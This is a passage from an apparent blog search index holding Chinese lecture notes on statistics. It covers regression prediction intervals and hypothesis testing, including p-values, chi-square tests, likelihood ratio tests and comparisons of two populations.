$\beta_0$ 进行相应推断, 过程类似.</li></ul></li></ul><h2 id="预测"><a href="#预测" class="headerlink" title="预测"></a>预测</h2><ul><li><p><strong>例</strong>  当 $X=x_0$ 时, $y_0=\beta_0+\beta_1 x_0+\varepsilon_0$, 其中 $\varepsilon\sim N(0,\sigma^2)$. 令</p><script type="math/tex; mode=display">  \mu_0=E(y_0)=\beta_0+\beta_1 x_0,</script><p>  给出对 $\mu_0$ 的预测.</p></li><li><p><strong>解答</strong>  用拟合直线上 $x_0$ 处的取值 $\hat y_0$ 给出 $\mu_0$ 的点估计:</p><script type="math/tex; mode=display">  \hat y_0=\hat\beta_0+\hat\beta_1x_0=\overline{y}-\hat\beta_1(x_0-\overline{x})=\sum_{i=1}^{n}(\dfrac{1}{n}+\dfrac{(x_i-\overline{x})(x_0-\overline{x})}{S_{xx}})y_i</script><p>  分别给出</p><ul><li>$E(\hat y_0)=E(\hat\beta_0+\hat\beta_1x_0)=\beta_0+\beta_1x_0=\mu_0$.</li><li><p>$Var(\hat y_0)=\sum_{i=1}^{n}\Big(\dfrac{1}{n}+\dfrac{(x_i-\overline{x})(x_0-\overline{x})}{S_{xx}}\Big)^2\sigma^2=\Big(\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}\Big)\sigma^2$.</p><p>从而</p><script type="math/tex; mode=display">\dfrac{\hat y_0-\mu_0}{se(\hat y_0)}\sim N(0,1).</script><p>使用 $\hat{se}(\hat y_0)=\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}$ 估计 $se(\hat y_0)$, 我们有</p><script type="math/tex; mode=display">\dfrac{\hat y_0-\mu_0}{\hat{se}(\hat y_0)}\sim t(n-2).</script><p>从而 $\mu_0$ 的 $(1-\alpha)-$ 置信的双侧区间估计为</p><script type="math/tex; mode=display">\Big(\hat y_0-t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}},\hat y_0+t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}\Big).</script></li></ul></li><li><p><strong>例</strong>  当 $X=x_0$ 时, $y_0=\beta_0+\beta_1 x_0+\varepsilon_0$, 其中 $\varepsilon\sim N(0,\sigma^2)$. 给出对 $y_0$ 的预测.</p></li><li><p><strong>解答</strong>  $y_0\sim N(\mu_0,\sigma^2)$. 若 $\mu_0$ 已知, 则 $y_0$ 的(均方意义下最优)估计为 $\mu_0$.</p><p>  一般情况下, $y_0$ 的良好点估计为 $\hat y_0=\hat\beta_0+\hat\beta_1x_0$.</p><p>  注意到 $y_0$ 与 $\hat y_0$ 相互独立, 从而 $\hat y_0- y_0$ 服从正态分布.</p><p>  分别给出</p><ul><li>$E(\hat y_0-y_0)=E(\hat y_0)-E(y_0)=\mu_0-\mu_0=0$.</li><li><p>$Var(\hat y_0-y_0)=Var(\hat y_0)+Var(y_0)=\sigma^2(1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}})$.</p><p>从而</p><script type="math/tex; mode=display">\dfrac{\hat y_0-y_0}{\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}}\sim N(0,1).</script><p>进而</p><script type="math/tex; mode=display">\dfrac{\hat y_0-y_0}{\hat\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}}\sim t(n-2).</script></li></ul></li></ul><pre><code>从而 $y_0$ 的 $(1-\alpha)-$ 置信的双侧区间估计为$$\Big(\hat y_0-t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}},\hat y_0+t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}\Big).$$</code></pre><ul><li><p><strong>注</strong>  当 $x_0$ 与 $\overline{x}$ 距离增加时, 估计误差增大.</p></li><li><p><strong>注</strong></p><ul><li>结合实际理解 $\beta$.</li><li>外推需谨慎.</li><li>截距为 0 的回归复杂度 $n-2\rightarrow n-1$.</li><li>回归方程不可逆转使用.</li><li>常见应用:<ul><li>描述趋势.</li><li>预测均值\取值.</li><li>实验控制.</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记7</title>
      <link href="/2023/05/20/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-7/"/>
      <url>/2023/05/20/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-7/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-7-假设检验"><a href="#Chap-7-假设检验" class="headerlink" title="Chap 7 假设检验"></a>Chap 7 假设检验</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p><strong>例(女士品茶)</strong>  某女士声称可区分奶茶是先加牛奶还是先加茶. <strong>R.Fisher</strong> 设计实验: 各有 4 杯奶茶随机排成一排, 将这一信息告知女士. 考虑假设 $H$: 该女士没有区分能力. 当 $H$ 正确的情况下, 4 杯全对的概率为</p><script type="math/tex; mode=display">  \dfrac{C_4^4\cdot C_4^0}{C_8^4}=\dfrac{1}{70}.</script><p>  下述两种情况之一必发生:</p><ul><li>$H$ 不正确 (<strong>i.e.</strong>该女士有区分能力);</li><li><p>$H$ 正确 (发生了一件概率为 $\dfrac{1}{70}$ 的事情).</p><p>通常选择阈值 $\alpha=0.05,0.01,0.1$ (预先给定的显著性水平). 若女士选对了三杯, 则在 $H$ 正确的前提下, 挑对三杯及以上的概率为</p><script type="math/tex; mode=display">\dfrac{C_4^4\cdot C_4^0}{C_8^4}+\dfrac{C_4^3\cdot C_4^1}{C_8^4}=\dfrac{17}{70}\approx 0.243.</script></li></ul></li><li><p><strong>注</strong></p><ul><li><p><strong>Fisher</strong> 显著性检验;</p></li><li><p>若认可某组观测(样本), 则用它来证实或证伪某个理论(断言)具有天然的不对等;</p></li><li><p>$H$ 可以模型化:</p><script type="math/tex; mode=display">  P(X=k)\dfrac{C_4^k\cdot C_4^{4-k}}{C_8^4}.</script></li><li><p>历史注记:</p><ul><li><strong>Fisher</strong> 显著性检验;</li><li><strong>Neyman-Pearson</strong> 检验;</li><li>零假设显著性检验 (<strong>MHST</strong>).</li></ul></li></ul></li><li><p><strong>定义(统计假设)</strong>  对一个或多个总体的某种断言或猜测.</p><ul><li>原假设: 被检验的假设 $H_0$;</li><li>备择假设: 拒绝 $H_0$ 后可供选择的假设 $H_1$.</li><li>若假设可表为参数形式, 那么 $H_0: \theta\in\Theta_0$, $H_1: \theta\in\Theta_1$, 且 $\Theta_0\cap\Theta_1=\varnothing$, $\Theta_0\cup\Theta_1=\theta$ 的所有可能取值之集.</li></ul></li><li><p><strong>例</strong>  假设 $X\sim N(\mu,\sigma^2)$, 其中 $\sigma^2$ 已知.</p><ul><li>$H_0:\mu=\mu_0,\quad H_1:\mu\ne\mu_0$. (双侧假设)</li><li>$H_0:\mu=\mu_0,\quad H_1:\mu&gt;\mu_0$. (单侧假设)</li><li>$H_0:\mu\le\mu_0,\quad H_1:\mu&gt;\mu_0$. (单侧假设)</li><li>$H_0:\mu_1=\mu_2,\quad H_1:\mu_1\ne\mu_2$. (双侧假设)</li></ul></li><li><p><strong>注</strong></p><ul><li>简单假设: 只对应一个总体;</li><li>复合假设: 对应多个总体;</li><li>若 $\sigma^2$ 未知, 则 $H_0: \mu=\mu_0\Leftrightarrow H_0: \mu=\mu_0,\sigma^2$ 任意, 是一个复合假设.</li></ul></li><li><p><strong>定义(假设检验)</strong>  依据样本(观测)的决策(拒绝或不拒绝 $H_0$)过程.</p></li><li><p><strong>定义(检验准则)</strong>  做出决策的一个具体法则.</p></li><li><p><strong>定义(拒绝)</strong>  在原假设 $H_0$ 为真的前提下, 所观测的样本出现的概率如果是很小的, 意味着样本提供的概率拒绝 $H_0$.</p></li><li><p><strong>定义(拒绝域/临界域)</strong>  形式上可抽象为</p><script type="math/tex; mode=display">  R=\{(X_1,\cdots,X_n)\mid T(X_1,\cdots,X_n)\ge c\}.</script><p>  其中 $c$ 被定义为临界值. 此时检验准则为, 若样本 $(X_1,\cdots,X_n)\in R$, 则拒绝假设 $H_0$.</p></li><li><p><strong>定义(显著性检验)</strong>  对事先给定的 $\alpha\in(0,1)$, 若 $P_{\theta}(T(X_1,\cdots,X_n)\ge c)\le\alpha$, $\forall\,\theta\in\Theta_0$, 则称这是一个水平为 $\alpha$ 的显著性检验.</p></li><li><p><strong>例</strong>  假设 $X\sim N(\mu,\sigma^2)$, 其中 $\sigma^2$ 已知, 给定检验水平 $\alpha\in(0,1)$ 和已观测样本 $X_i(1\le i\le n)$. $H_0:\mu=\mu_0$, $H_1:\mu\ne\mu_0$. 对原假设进行检验.</p></li><li><p><strong>解答</strong>  拒绝域为双侧拒绝, 当 $H_0$ 为真时, 控制 $P(\vert\overline{X}-\mu_0\vert\ge c)\le\alpha$. </p><p>  根据 <strong>CLT</strong>, 注意到</p><script type="math/tex; mode=display">  \overline{X}-\mu_0\sim N(0,\dfrac{\sigma^2}{n})\Leftrightarrow\dfrac{\overline{X}-\mu_0}{\tfrac{\sigma}{\sqrt{n}}}\sim N(0,1).</script><p>  取 $\dfrac{c}{\tfrac{\sigma}{\sqrt{n}}}=Z_{\tfrac{\alpha}{2}}\Rightarrow c=\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\tfrac{\alpha}{2}}$. </p><p>  给出在 $\alpha$ 的检验水平下拒绝 $H_0$ 的条件: 若 $\vert\overline{X}-\mu_0\vert\ge\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\tfrac{\alpha}{2}}$, 则拒绝 $H_0$.</p></li><li><p><strong>例</strong>  假设 $X\sim N(\mu,\sigma^2)$, 其中 $\sigma^2$ 已知, 给定检验水平 $\alpha\in(0,1)$ 和已观测样本 $X_i(1\le i\le n)$. $H_0:\mu\ge\mu_0$, $H_1:\mu&lt;\mu_0$. 对原假设进行检验.</p></li><li><p><strong>解答</strong>  拒绝域为单侧拒绝, 当 $H_0$ 为真时, 控制 $P(\overline{X}\le c)\le\alpha$.</p><p>  根据 <strong>CLT</strong>, 注意到</p><script type="math/tex; mode=display">  \overline{X}-\mu\sim N(0,\dfrac{\sigma^2}{n})\Leftrightarrow\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\sim N(0,1).</script><p>  因此</p><script type="math/tex; mode=display">  \begin{aligned}  P(\overline{X}\le c)&=P(\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\le \dfrac{c-\mu}{\tfrac{\sigma}{\sqrt{n}}})\\  &=P(Z\le\dfrac{c-\mu}{\tfrac{\sigma}{\sqrt{n}}})\\  &=\varPhi(\dfrac{c-\mu}{\tfrac{\sigma}{\sqrt{n}}}),\forall\,\mu\ge\mu_0.  \end{aligned}</script></li></ul><pre><code>取 $\dfrac{c-\mu_0}{\tfrac{\sigma}{\sqrt{n}}}=-Z_{\alpha}\Rightarrow c=\mu_0-\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\alpha}$. 给出在 $\alpha$ 的检验水平下拒绝 $H_0$ 的条件: 若 $\overline{X}\le\mu_0-\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\alpha}$, 则拒绝 $H_0$.</code></pre><ul><li><p><strong>注</strong></p><ul><li><p>这种方法称为 $Z$-检验.</p></li><li><p>若 $\sigma^2$ 未知, 考虑</p><script type="math/tex; mode=display">  \dfrac{\overline{X}-\mu}{\tfrac{S}{\sqrt{n}}}\sim t(n-1).</script><p>  这种方法称为 $t$-检验.</p></li></ul></li></ul><h2 id="Neyman-Pearson-假设检验"><a href="#Neyman-Pearson-假设检验" class="headerlink" title="Neyman-Pearson 假设检验"></a>Neyman-Pearson 假设检验</h2><ul><li><p><strong>定义(错误)</strong>  Ⅰ类错误: 在 $H_0$ 为真时拒绝 $H_0$; Ⅱ类错误: 在 $H_0$ 为假时不拒绝 $H_0$. 对应的概率分别为:</p><script type="math/tex; mode=display">  \begin{aligned}  \alpha(R)&:=P_{\theta}(Ⅰ)=P_{\theta}((X_1,\cdots,X_n)\in R),\theta\in\Theta_0;\\  \beta(R)&:=P_{\theta}(Ⅱ)=P_{\theta}((X_1,\cdots,X_n)\in R^c),\theta\in\Theta_1.  \end{aligned}</script><p>  对于已划分的 $R$ 来说, 是定义域不同的 $\theta$ 的函数.</p></li><li><p><strong>注</strong></p><ul><li>依据样本做决策, 错误不能根本避免;</li><li>一次决策不能同时犯两种错误;</li><li>$n$ 固定, 两种错误发生的概率此消彼长.</li></ul></li><li><p><strong>例(直觉)</strong></p><ul><li>都不拒绝 $H_0$, 那么 $P_{\theta}(Ⅰ)=0$, $P_{\theta}(Ⅱ)=1$.</li><li>考虑事件 $H_0:$ 合格, 事件 $H_1:$ 不合格, 当 $P_{\theta}(Ⅰ)$ 变小时, 不容易拒绝事件, 不合格不容易被检出, 从而 $P_{\theta}(Ⅱ)$ 变大.</li></ul></li><li><p><strong>定义(功效函数)</strong>    给定 $\theta$ 与临界域 $R$, 拒绝原假设 $H_0$ 的概率为:</p><script type="math/tex; mode=display">  P_{\theta}((X_1,\cdots,X_n)\in R)=1-\beta(R),\,\theta\in\Theta_1.</script></li><li><p><strong>定义(Neyman-Pearson 范式)</strong>  $n$ 固定, 控制 $P_{\theta}(Ⅰ)\le\alpha$, 其中 $\alpha$ 为预先给定的检验水平, 再在这个限制下使 $P_{\theta}(Ⅱ)(\theta\in\Theta_1)$ 尽可能小.</p></li><li><p><strong>注</strong></p><ul><li>$\alpha$ 固定时, 使 $P_{\theta}(Ⅱ)(\theta\in\Theta_1)$ 最小的检验称为水平 $\alpha$ 下的一致最优检验;</li><li>原假设 $H_0$ 和备择假设 $H_1$ 一般是地位不对等的:<ul><li>原假设通常是受到保护的, 证据不充分不能拒绝;</li><li>备择假设通常是真正感兴趣的.</li></ul></li><li>一致最优检验不一定存在, 一般也不易求解;</li><li>$\mu_0\in$ 置信区间 $\Leftrightarrow$ 假设检验 $(H_0: \mu=\mu_0, H_1: \mu\ne\mu_0)$ 不拒绝 $H_0$.</li></ul></li></ul><h2 id="假设检验与置信区间"><a href="#假设检验与置信区间" class="headerlink" title="假设检验与置信区间"></a>假设检验与置信区间</h2><ul><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, $\sigma^2$ 已知, $\alpha&gt;0$ 给定, $X_1,\cdots,X_n$ 为随机样本.</p></li><li><p><strong>解答 </strong> 其双侧置信区间为</p><script type="math/tex; mode=display">  P=(\overline{X}-Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}},\overline{X}+Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}}).</script><p>  考虑假设检验 $H_0:\mu=\mu_0$, $H_1:\mu\ne\mu_0$. 需要控制</p><script type="math/tex; mode=display">  P_{H_0}(\vert\overline{X}-\mu_0\vert\ge c)\le\alpha.</script><p>  检验准则为 $\vert\overline{X}-\mu_0\vert\ge Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}}$ 时拒绝 $H_0$. 我们给出接受域</p><script type="math/tex; mode=display">  R^c=\{(X_1,\cdots,X_n)\mid \vert\overline{X}-\mu_0\vert<Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}}\}\\  =\{(X_1,\cdots,X_n)\mid \mu_0\in P\}.</script><p>  由此可见, $\mu_0\in P\Leftrightarrow$ 用 $\overline{X}$ 为检验统计量, 假设检验不拒绝 $H_0$.(<strong>对偶关系</strong>)</p></li></ul><h2 id="检验的-P-值"><a href="#检验的-P-值" class="headerlink" title="检验的 P 值"></a>检验的 P 值</h2><ul><li><p><strong>定义</strong>  当原假设 $H_0$ 为真时, 检验统计量的观测值以及更极端观测出现的概率. </p></li><li><p><strong>例(选举问题)</strong>  $n=1200$, 调查到的支持比例为 $\tfrac{684}{1200}\approx 0.57$ (观测值).</p></li><li><p><strong>解答</strong>  (1) $H_0:p=p_0$ v.s. $H_1:p&gt;p_0$ ($p_0$ 预先给定).</p><p>  考虑检验统计量 $P_n$, 则由 <strong>CLT</strong>:</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}\stackrel{近似}{\sim}N(0,1).</script><p>  当 $H_0$ 为真时, $p=p_0$, 此时 $se(P_n)=\sqrt{\dfrac{p_0(1-p_0)}{n}}$. 因此 <strong>P</strong> 值</p><script type="math/tex; mode=display">  P_{H_0}(P_n\ge p_n)=P(\dfrac{P_n-p_0}{se(P_n)}\ge\dfrac{p_n-p_0}{se(P_n)})\approx P(Z\ge z_0).</script><p>  其中</p><script type="math/tex; mode=display">  Z\stackrel{近似}{\sim}N(0,1),z_0=\dfrac{p_n-p_0}{se(P_n)}=\dfrac{p_n-p_0}{\sqrt{\tfrac{p_0(1-p_0)}{n}}}.</script><p>  因此</p><script type="math/tex; mode=display">  P_{H_0}(P_n\ge p_n)=1-\varPhi(\dfrac{p_n-p_0}{\sqrt{\tfrac{p_0(1-p_0)}{n}}}).</script><p>  若 $p_0=0.55$, 则 <strong>P</strong> 值 $\approx 0.081$; 若 $p_0=0.5$, 则 <strong>P</strong> 值 $\ll 0.001$.</p><p>  在水平 $\alpha$ 下拒绝 $H_0\Leftrightarrow$ <strong>P</strong> 值 $\le\alpha$.</p></li><li><p><strong>注</strong></p><ul><li><strong>P</strong> 值作为数据 (观测) 拒绝 $H_0$ 的证据.</li><li>强弱的度量: <strong>P</strong> 值越小, 拒绝 $H_0$ 的证据越强 (非正式的).</li><li><strong>P</strong> 值 $\ne$ $P(H_0\mid $ 观测$)$.</li><li>若 <strong>P</strong> 值不小, 则不拒绝 $H_0$, 原因可能为 $H_0$ 真 / $H_0$ 不真, 但检验功效不大.</li></ul></li><li><p><strong>定义</strong>  若拒绝 $H_0:\theta\in\Theta_0\Leftrightarrow T(X_1,\cdots,X_n)\ge C$, 则检验的 <strong>P</strong> 值 $:=$</p><script type="math/tex; mode=display">  \sup_{\theta\in\Theta_0}P_{\theta}(T(X_1,\cdots,X_n)\ge T(x_1,\cdots,x_n)).</script><p>  其中 $T(x_1,\cdots,x_n)$ 为检验统计量的观测值.</p></li><li><p><strong>解答</strong>  (2) $H_0:p\le p_0$ v.s. $H_1:p&gt;p_0$ ($p_0$ 预先给定).</p><p>  考虑检验统计量 $P_n$, 则由 <strong>CLT</strong>:</p><script type="math/tex; mode=display">  \dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}\stackrel{近似}{\sim}N(0,1).</script><p>  当 $H_0$ 为真时, 此时 $se(P_n)\approx \hat{se}(P_n)=\sqrt{\dfrac{p_n(1-p_n)}{n}}$. 因此 <strong>P</strong> 值</p><script type="math/tex; mode=display">  P_{H_0}(P_n\ge p_n)=P(\dfrac{P_n-p}{\hat{se}(P_n)}\ge\dfrac{p_n-p}{\hat{se}(P_n)})\approx P(Z\ge z_0).</script><p>  其中</p><script type="math/tex; mode=display">  Z\stackrel{近似}{\sim}N(0,1),z_0=\dfrac{p_n-p}{\hat{se}(P_n)}=\dfrac{p_n-p}{\sqrt{\tfrac{p_n(1-p_n)}{n}}}.</script><p>  因此</p><script type="math/tex; mode=display">  P_{H_0}(P_n\ge p_n)=1-\varPhi(\dfrac{p_n-p}{\sqrt{\tfrac{p_n(1-p_n)}{n}}}),\forall\,p\le p_0.</script><p>  因此 <strong>P</strong> 值</p><script type="math/tex; mode=display">  \sup_{p\le p_0}\Big(1-\varPhi(\dfrac{p_n-p}{\sqrt{\tfrac{p_n(1-p_n)}{n}}})\Big)=1-\varPhi(\dfrac{p_n-p_0}{\sqrt{\tfrac{p_n(1-p_n)}{n}}}).</script><p>  若 $p_0=0.55$, 则 <strong>P</strong> 值 $\approx 0.081$; 若 $p_0=0.5$, 则 <strong>P</strong> 值 $\ll 0.001$.</p></li></ul><h2 id="拟合优度检验"><a href="#拟合优度检验" class="headerlink" title="拟合优度检验"></a>拟合优度检验</h2><ul><li><p><strong>定义(Pearson 卡方统计量)</strong></p><script type="math/tex; mode=display">  \chi^2:=\sum_{i=1}^{k}\dfrac{(O_i-E_i)^2}{E_i}\stackrel{近似}{\sim}\chi^2(k-1).</script><p>  其中 $O_i$ 为观测频数, $E_i$ 为期望频数 ($H_0$ 真的条件下).</p></li><li><p><strong>定理</strong>  $H_0: P(X\in$ 第 $i$ 单元$)=p_i(1\le i\le k)$. 若 $H_0$ 为真, 当 $n\rightarrow\infty$ 时, 有</p><script type="math/tex; mode=display">  \chi^2\rightarrow\chi^2(k-1).</script></li><li><p><strong>例</strong>  投掷一枚骰子 60 次.</p><p>  | 点数     | 1    | 2    | 3    | 4    | 5    | 6    | 总计 |<br>  | ———— | —— | —— | —— | —— | —— | —— | —— |<br>  | 观测频数 | 4    | 6    | 17   | 16   | 8    | 9    | 60   |<br>  | 期望频数 | 10   | 10   | 10   | 10   | 10   | 10   | 60   |</p><p>  $H_0:$ 分布均匀, $H_1:$ 分布不均匀.</p></li><li><p><strong>解答</strong>  检验统计量的观测值:</p><script type="math/tex; mode=display">  \dfrac{(4-10)^2}{10}+\dfrac{(6-10)^2}{10}+\cdots+\dfrac{(9-10)^2}{10}=14.2.</script><p>  自由度为 $6-1=5$. <strong>P</strong> 值 $=P_{H_0}(\chi^2\ge 14.2)\approx 0.014$.</p></li><li><p><strong>注</strong>  在实际应用中, 需要满足 $E_i=nP_i\ge 5$, 才能较好使用 <strong>Pearson</strong> 定理.</p></li><li><p><strong>例(列联表独立性检验)</strong>  对某项议题态度与年龄段是否独立.</p><p>  |      | 青年 | 中年 | 老年 |      |<br>  | —— | —— | —— | —— | —— |<br>  | 支持 | 20   | 40   | 20   | 80   |<br>  | 反对 | 30   | 30   | 10   | 70   |<br>  |      | 50   | 70   | 30   | 150  |</p><p>  $H_0:$ 独立, $H_1:$ 不独立.</p></li><li><p><strong>解答</strong>  $P_{ij}=P_{i+}P_{+j}$, 其中 $P_{i+}$, $P_{+j}$ 称为边际概率.</p><p>  在 $H_0$ 为真前提下估计 $P_{ij}$. <strong>MLE</strong>:</p><script type="math/tex; mode=display">  P_{ij}^*=(P_{i+}P_{+j})^*=P_{i+}^*P_{+j}^*=\dfrac{sum(row_i)}{n}\times\dfrac{sum(column_j)}{n}.</script><p>  得到</p><script type="math/tex; mode=display">  E_{ij}=nP_{ij}\approx nP_{ij}^*=\dfrac{1}{n}sum(row_i)\times sum(column_j).</script><p>  计算得检验统计量观测值为 6.12, 自由度为 $(a-1)(b-1)=2$.</p><p>  得到 <strong>P</strong> 值 $=P_{H_0}(\chi^2\ge 6.12)\approx 0.0469$.</p></li><li><p><strong>注</strong>  对于 $a$ 行 $b$ 列, 当 $H_0$ 成立时, 其未知参数个数为 $s=(a-1)+(b-1)$.</p><p>  因此卡方自由度为:</p><script type="math/tex; mode=display">  ab-1-s=ab-1-(a-1)-(b-1)=(a-1)(b-1).</script></li></ul><h2 id="似然比检验"><a href="#似然比检验" class="headerlink" title="似然比检验"></a>似然比检验</h2><ul><li><p><strong>例</strong>  两种硬币 ($p=0.5$, $p=0.7$) 投掷 $n=10$ 次, 正面向上 $X=x$ 次. 提出假设 $H_0:p=0.5$ v.s. $p=0.7$. 考虑</p><script type="math/tex; mode=display">  \dfrac{P_{H_0}(X=x)}{P_{H_1}(X=x)}\le c\leftrightarrow x 的范围</script><p>  我们需要控制</p><script type="math/tex; mode=display">  P_{H_0}\Big(似然比\le c\Big)\le\alpha.</script></li><li><p><strong>注</strong></p><ul><li>当 $H_0$, $H_1$ 均为简单假设时 (<strong>N-P</strong>), 证明: 似然比检验最优 (功效最大).</li><li>当 $H_0$, $H_1$ 不全为简单假设时, 似然比检验一般不最优, 但通常表现不错.</li></ul></li><li><p><strong>定义(广义似然比)</strong>  $H_0:\theta\in\Theta_0$ v.s. $H_1:\theta\in\Theta_1$, $X_1,\cdots,X_n$ 为随机样本.</p><p>  考虑广义似然比</p><script type="math/tex; mode=display">  \Lambda^*:=\dfrac{\sup_{\theta\in\Theta_0}L(\theta)}{\sup_{\theta\in\Theta_1}L(\theta)}</script><p>  基于技术原因, 检验统计量选为</p><script type="math/tex; mode=display">  \Lambda:=\dfrac{\sup_{\theta\in\Theta_0}L(\theta)}{\sup_{\theta\in\Theta_0\cup\Theta_1}L(\theta)}=\min\{\Lambda^*,1\}=\Lambda(X_1,\cdots,X_n).</script><p>  $\Lambda$ 越小则越反对 $H_0$ (拒绝域的形状). 选择 $\lambda_0$ 使</p><script type="math/tex; mode=display">  P_{H_0}(\Lambda\le\lambda_0)\le\alpha.</script><p>  至此得到了检验准则.</p></li><li><p><strong>定理</strong>  在一定(光滑性)条件下, 当 $n\rightarrow\infty$ 时, 在 $H_0$ 为真前提下:</p><script type="math/tex; mode=display">  -2\log\Lambda\rightarrow\chi^2(d).</script><p>  其中自由度 $d=\dim(\Theta_0\cup\Theta_1)-\dim(\Theta_0)$. 这里的 $\dim$ 指自由参数的个数.</p></li><li><p><strong>例(多项分布检验)</strong>  $H_0:p_1=p_1^<em>$, $\cdots$, $p_k=p_k^</em>$, 观测频数分别为 $n_1,\cdots,n_k$.</p></li><li><p><strong>解答</strong>  得到</p><script type="math/tex; mode=display">  L(p_1,\cdots,p_k)=C_n^{n_1,\cdots,c_k}p_1^{n_1}\cdots p_k^{n_k}.</script><p>  因此</p><script type="math/tex; mode=display">  \Lambda=\dfrac{\sup_{\theta\in\Theta_0}L(\theta)}{\sup_{\theta\in\Theta_0\cup\Theta_1}L(\theta)}=\dfrac{L(p_1^0,\cdots,p_k^0)}{L(p_1^*,\cdots,p_k^*)}.</script><p>  已知</p><script type="math/tex; mode=display">  n_i=np_i^*,E_i=np_i^0,O_i=n_i.</script><p>  且</p><script type="math/tex; mode=display">  x\log\dfrac{x}{x_0}\stackrel{Taylor}{=}0+(x-x_0)+\dfrac{1}{2}\dfrac{(x-x_0)^2}{x_0}+\cdots</script><p>  计算得</p><script type="math/tex; mode=display">  \begin{aligned}  -2\log\Lambda&=-2\sum_{i=1}^{k}\log\big(\dfrac{p_i^0}{p_i^*}\big)^{n_i}\\  &=-2\sum_{i=1}^{k}n_i\log\dfrac{p_i^0}{p_i^*}\\  &=2\sum_{i=1}^{k}O_i\log\dfrac{O_i}{E_i}\\  &=\sum_{i=1}^{k}\dfrac{(O_i-E_i)^2}{E_i}+\cdots.  \end{aligned}</script><p>  考虑到 $\dim(\Theta_0)=0$, $\dim(\Theta_0\cup\Theta_1)=k-1$, 因此给出</p><script type="math/tex; mode=display">  \sum_{i=1}^{k}\dfrac{(O_i-E_i)^2}{E_i}\stackrel{近似}{\sim}\chi^2(k-1).</script></li></ul><h2 id="两独立总体比较"><a href="#两独立总体比较" class="headerlink" title="两独立总体比较"></a>两独立总体比较</h2><ul><li><p>两独立总体:</p><p>  | 总体 | 均值    | 方差         | 样本 (iid)       |<br>  | —— | ———- | —————— | ———————— |<br>  | $X$  | $\mu_1$ | $\sigma_1^2$ | $X_1,\cdots,X_n$ |<br>  | $Y$  | $\mu_2$ | $\sigma_2^2$ | $Y_1,\cdots,Y_m$ |</p></li><li><p><strong>定义(比较均值)</strong>:</p><p>  给出 $E(\overline{X}-\overline{Y})=\mu_1-\mu_2$, $Var(\overline{X}-\overline{Y})=\dfrac{\sigma_1^2}{n}+\dfrac{\sigma_2^2}{m}=se^2$. 参考置信区间部分.</p></li><li><p><strong>定理</strong>  给出 $W_1\sim\chi^2(k_1)$, $W_2\sim\chi^2(k_2)$, 且 $W_1,W_2$ 独立, 我们有</p><script type="math/tex; mode=display">  \dfrac{W_1/k_1}{W_2/k_2}\sim F(k_1,k_2).</script></li><li><p><strong>定义(比较方差)</strong>: 假设 $X$, $Y$ 均为正态. 提出假设 $H_0:\sigma_1^2=\sigma_2^2$ v.s. $H_1:\sigma_1^2\ne\sigma_2^2$.</p><script type="math/tex; mode=display">  \dfrac{(n-1)S_1^2}{\sigma_1^2}\sim\chi^2(n-1), \dfrac{(m-1)S_2^2}{\sigma_2^2}\sim\chi^2(m-1).</script><p>  考虑检验统计量(依赖于<strong>样本</strong>或<strong>已知参数</strong>)</p><script type="math/tex; mode=display">  \dfrac{S_1^2}{S_2^2}.</script><p>  当 $H_0$ 为真时, 有</p><script type="math/tex; mode=display">  \dfrac{S_1^2}{S_2^2}\sim F(n-1,m-1).</script><p>  检验准则为当</p><script type="math/tex; mode=display">  \dfrac{S_1^2}{S_2^2}\ge F_{\tfrac{\alpha}{2}}(n-1,m-1)\,或\,\dfrac{S_1^2}{S_2^2}\le F_{1-\tfrac{\alpha}{2}}(n-1,m-1)</script><p>  时拒绝原假设.</p></li><li><p><strong>注</strong>  由定义 $F_{1-\tfrac{\alpha}{2}}(n-1,m-1)=\dfrac{1}{F_{\tfrac{\alpha}{2}}(m-1,n-1)}$.</p></li><li><p><strong>例(比较成功率/失败率)</strong>  阿司匹林对降低心脏病发病率的有效性.</p><p>  |          | 心脏病发作 | 心脏病未发作 | 合计  | 发作率 |<br>  | ———— | ————— | —————— | ——- | ——— |<br>  | 阿司匹林 | 139        | 10898        | 11037 | 0.0126 |<br>  | 安慰剂   | 239        | 10795        | 11034 | 0.0217 |</p><p>  提出假设 $H_0:p_1=p_2$ (无效) v.s. $H_1:p_1&lt;p_2$ (有效), 检验统计量为 $P_1-P_2$.</p><p>  容易得到 